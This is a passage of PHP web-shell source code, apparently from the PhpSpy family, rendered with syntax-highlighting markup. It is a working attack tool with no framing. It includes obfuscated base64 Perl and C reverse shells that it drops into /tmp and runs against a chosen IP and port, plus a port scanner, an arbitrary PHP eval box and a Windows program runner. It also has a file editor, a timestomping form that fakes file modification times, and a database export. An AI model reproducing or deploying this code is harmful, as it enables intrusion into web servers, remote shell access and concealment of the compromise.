<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;tr class="head"&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td width="2%" align="center"&gt;&lt;input name="chkall" value="on"<span style="text-decoration: underline;"> type="checkbox" onclick="CheckAll(this.form)" /&gt;&lt;/td&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;Name&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;Rows&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;Data_length&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;Create_time&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;Update_time&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ($highver) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;Engine&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;Collation&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;Operate&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;/tr&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;tr class='.bg().'&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;&amp;nbsp;&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;Total tables: '.$table_num.'&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;'.$table_rows.'&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;'.$data_size.'&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td colspan="'.($highver ? 5 : 3).'"&gt;&amp;nbsp;&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;/tr&gt;');

<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p("&lt;tr class=\"".bg()."\"&gt;&lt;td colspan=\"".($highver ? 9 : 7)."\"<span style="text-decoration: underline;">&gt;&lt;input name=\"saveasfile\" value=\"1\" type=\"checkbox\" /&gt; Save as file &lt;input class=\"input\" name=\"path\" value=\"".SA_ROOT.$dbname.".sql\" type=\"text\" size=\"60\" /&gt; &lt;input class=\"bt\" type=\"submit\" value=\"Export selection table\" /&gt;&lt;/td&gt;&lt;/tr&gt;");</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('doing','backupmysql');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   formfoot();
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p("&lt;/table&gt;");
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   fr($query);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   tbfoot();
<span style="color: #969896; background-color: #1d1f21;"> </span>   @mysql_close();
}//end mysql

elseif ($action == 'backconnect') {
<span style="color: #969896; background-color: #1d1f21;"> </span>   !$yourip &amp;&amp; $yourip = $_SERVER['REMOTE_ADDR'];
<span style="color: #969896; background-color: #1d1f21;"> </span>   !$yourport &amp;&amp; $yourport = '12345';
<span style="color: #969896; background-color: #1d1f21;"> </span>   $usedb = array('perl'=&gt;'perl','c'=&gt;'c');

<span style="color: #969896; background-color: #1d1f21;"> </span>   $back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJ<span style="text-decoration: underline;">HN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj".</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   "aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9<span style="text-decoration: underline;">ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR".</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   "hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3<span style="text-decoration: underline;">J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT".</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   "sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JT<span style="text-decoration: underline;">kVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI".</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9y<span style="text-decoration: underline;">OiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi".</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   "KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQ<span style="text-decoration: underline;">iKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl".</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   "OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
<span style="color: #969896; background-color: #1d1f21;"> </span>   $back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0<span style="text-decoration: underline;">KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC".</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   "BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb<span style="text-decoration: underline;">2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb".</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   "SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQog<span style="text-decoration: underline;">c2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd".</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   "KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnp<span style="text-decoration: underline;">lcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ".</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   "sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSV<span style="text-decoration: underline;">BQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC".</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   "Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8M<span style="text-decoration: underline;">Ckgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D".</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   "QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1z<span style="text-decoration: underline;">KTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp".</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   "Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiB<span style="text-decoration: underline;">jbG9zZShmZCk7IA0KfQ==";</span>

<span style="color: #969896; background-color: #1d1f21;"> </span>   if ($start &amp;&amp; $yourip &amp;&amp; $yourport &amp;&amp; $use){
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ($use == 'perl') {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   cf('/tmp/angel_bc',$back_connect);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $res = execute(which('perl')." /tmp/angel_bc $yourip $yourport &amp;");
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   cf('/tmp/angel_bc.c',$back_connect_c);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $res = execute('gcc -o /tmp/angel_bc /tmp/angel_bc.c');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   @unlink('/tmp/angel_bc.c');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $res = execute("/tmp/angel_bc $yourip $yourport &amp;");
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   m("Now script try connect to $yourip port $yourport ...");
<span style="color: #969896; background-color: #1d1f21;"> </span>   }

<span style="color: #969896; background-color: #1d1f21;"> </span>   formhead(array('title'=&gt;'Back Connect'));
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('action','backconnect');
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;p&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('Your IP:');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makeinput(array('name'=&gt;'yourip','size'=&gt;20,'value'=&gt;$yourip));
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('Your Port:');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makeinput(array('name'=&gt;'yourport','size'=&gt;15,'value'=&gt;$yourport));
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('Use:');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makeselect(array('name'=&gt;'use','option'=&gt;$usedb,'selected'=&gt;$use));
<span style="color: #969896; background-color: #1d1f21;"> </span>   makeinput(array('name'=&gt;'start','value'=&gt;'Start','type'=&gt;'submit','class'=&gt;'<span style="text-decoration: underline;">bt'));</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;/p&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   formfoot();
}//end

elseif ($action == 'portscan') {
<span style="color: #969896; background-color: #1d1f21;"> </span>   !$scanip &amp;&amp; $scanip = '127.0.0.1';
<span style="color: #969896; background-color: #1d1f21;"> </span>   !$scanport &amp;&amp; $scanport = '21,25,80,110,135,139,445,1433,3306,3389,5631,4395<span style="text-decoration: underline;">8';</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   formhead(array('title'=&gt;'Port Scan'));
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('action','portscan');
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;p&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('IP:');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makeinput(array('name'=&gt;'scanip','size'=&gt;20,'value'=&gt;$scanip));
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('Port:');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makeinput(array('name'=&gt;'scanport','size'=&gt;80,'value'=&gt;$scanport));
<span style="color: #969896; background-color: #1d1f21;"> </span>   makeinput(array('name'=&gt;'startscan','value'=&gt;'Scan','type'=&gt;'submit','class'<span style="text-decoration: underline;">=&gt;'bt'));</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;/p&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   formfoot();

<span style="color: #969896; background-color: #1d1f21;"> </span>   if ($startscan) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;h2&gt;Result &amp;raquo;&lt;/h2&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;ul class="info"&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   foreach(explode(',', $scanport) as $port) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $fp = @fsockopen($scanip, $port, &amp;$errno, &amp;$errstr, 1);<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if (!$fp) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;li&gt;'.$scanip.':'.$port.' ------------------------ &lt;span styl<span style="text-decoration: underline;">e="font-weight:bold;color:#f00;"&gt;Close&lt;/span&gt;&lt;/li&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>  } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;li&gt;'.$scanip.':'.$port.' ------------------------ &lt;span styl<span style="text-decoration: underline;">e="font-weight:bold;color:#080;"&gt;Open&lt;/span&gt;&lt;/li&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   @fclose($fp);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>  }<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;/ul&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
}

elseif ($action == 'eval') {
<span style="color: #969896; background-color: #1d1f21;"> </span>   $phpcode = trim($phpcode);
<span style="color: #969896; background-color: #1d1f21;"> </span>   if($phpcode){
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if (!preg_match('#&lt;\?#si', $phpcode)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $phpcode = "&lt;?php\n\n{$phpcode}\n\n?&gt;";
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   eval("?"."&gt;$phpcode&lt;?");
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   formhead(array('title'=&gt;'Eval PHP Code'));
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('action','eval');
<span style="color: #969896; background-color: #1d1f21;"> </span>   maketext(array('title'=&gt;'PHP Code','name'=&gt;'phpcode', 'value'=&gt;$phpcode));
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;p&gt;&lt;a href="http://w'.'ww.4ng'.'el.net/php'.'spy/pl'.'ugin/" target="_bla<span style="text-decoration: underline;">nk"&gt;Get plugins&lt;/a&gt;&lt;/p&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   formfooter();
}//end eval

elseif ($action == 'editfile') {
<span style="color: #969896; background-color: #1d1f21;"> </span>   if(file_exists($opfile)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $fp=@fopen($opfile,'r');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $contents=@fread($fp, filesize($opfile));
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   @fclose($fp);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $contents=htmlspecialchars($contents);
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   formhead(array('title'=&gt;'Create / Edit File'));
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('action','file');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('dir',$nowpath);
<span style="color: #969896; background-color: #1d1f21;"> </span>   makeinput(array('title'=&gt;'Current File (import new file name and new file)',<span style="text-decoration: underline;">'name'=&gt;'editfilename','value'=&gt;$opfile,'newline'=&gt;1));</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   maketext(array('title'=&gt;'File Content','name'=&gt;'filecontent','value'=&gt;$conte<span style="text-decoration: underline;">nts));</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   formfooter();

<span style="color: #969896; background-color: #1d1f21;"> </span>   goback();

}//end editfile

elseif ($action == 'newtime') {
<span style="color: #969896; background-color: #1d1f21;"> </span>   $opfilemtime = @filemtime($opfile);
<span style="color: #969896; background-color: #1d1f21;"> </span>   //$time = strtotime("$year-$month-$day $hour:$minute:$second");
<span style="color: #969896; background-color: #1d1f21;"> </span>   $cachemonth = array('January'=&gt;1,'February'=&gt;2,'March'=&gt;3,'April'=&gt;4,'May'=&gt;<span style="text-decoration: underline;">5,'June'=&gt;6,'July'=&gt;7,'August'=&gt;8,'September'=&gt;9,'October'=&gt;10,'November'=&gt;11,'December'=&gt;12);</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   formhead(array('title'=&gt;'Clone folder/file was last modified time'));
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('action','file');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('dir',$nowpath);
<span style="color: #969896; background-color: #1d1f21;"> </span>   makeinput(array('title'=&gt;'Alter folder/file','name'=&gt;'curfile','value'=&gt;$opf<span style="text-decoration: underline;">ile,'size'=&gt;120,'newline'=&gt;1));</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   makeinput(array('title'=&gt;'Reference folder/file (fullpath)','name'=&gt;'tarfile<span style="text-decoration: underline;">','size'=&gt;120,'newline'=&gt;1));</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   formfooter();
<span style="color: #969896; background-color: #1d1f21;"> </span>   formhead(array('title'=&gt;'Set last modified'));
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('action','file');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('dir',$nowpath);
<span style="color: #969896; background-color: #1d1f21;"> </span>   makeinput(array('title'=&gt;'Current folder/file (fullpath)','name'=&gt;'curfile',<span style="text-decoration: underline;">'value'=&gt;$opfile,'size'=&gt;120,'newline'=&gt;1));</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;p&gt;year:');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makeinput(array('name'=&gt;'year','value'=&gt;date('Y',$opfilemtime),'size'=&gt;4));
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('month:');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makeinput(array('name'=&gt;'month','value'=&gt;date('m',$opfilemtime),'size'=&gt;2));
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('day:');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makeinput(array('name'=&gt;'day','value'=&gt;date('d',$opfilemtime),'size'=&gt;2));
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('hour:');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makeinput(array('name'=&gt;'hour','value'=&gt;date('H',$opfilemtime),'size'=&gt;2));
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('minute:');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makeinput(array('name'=&gt;'minute','value'=&gt;date('i',$opfilemtime),'size'=&gt;2))<span style="text-decoration: underline;">;</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('second:');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makeinput(array('name'=&gt;'second','value'=&gt;date('s',$opfilemtime),'size'=&gt;2))<span style="text-decoration: underline;">;</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;/p&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   formfooter();
<span style="color: #969896; background-color: #1d1f21;"> </span>   goback();
}//end newtime

elseif ($action == 'shell') {
<span style="color: #969896; background-color: #1d1f21;"> </span>   if (IS_WIN &amp;&amp; IS_COM) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if($program &amp;&amp; $parameter) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $shell= new COM('Shell.Application');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $a = $shell-&gt;ShellExecute($program,$parameter);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   m('Program run has '.(!$a ? 'success' : 'fail'));
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   !$program &amp;&amp; $program = 'c:\windows\system32\cmd.exe';
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   !$parameter &amp;&amp; $parameter = '/c net start &gt; '.SA_ROOT.'log.txt';
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   formhead(array('title'=&gt;'Execute Program'));
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('action','shell');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   makeinput(array('title'=&gt;'Program','name'=&gt;'program','value'=&gt;$program,'<span style="text-decoration: underline;">newline'=&gt;1));</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;p&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   makeinput(array('title'=&gt;'Parameter','name'=&gt;'parameter','value'=&gt;$param<span style="text-decoration: underline;">eter));</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   makeinput(array('name'=&gt;'submit','class'=&gt;'bt','type'=&gt;'submit','value'=<span style="text-decoration: underline;">&gt;'Execute'));</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;/p&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   formfoot();
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
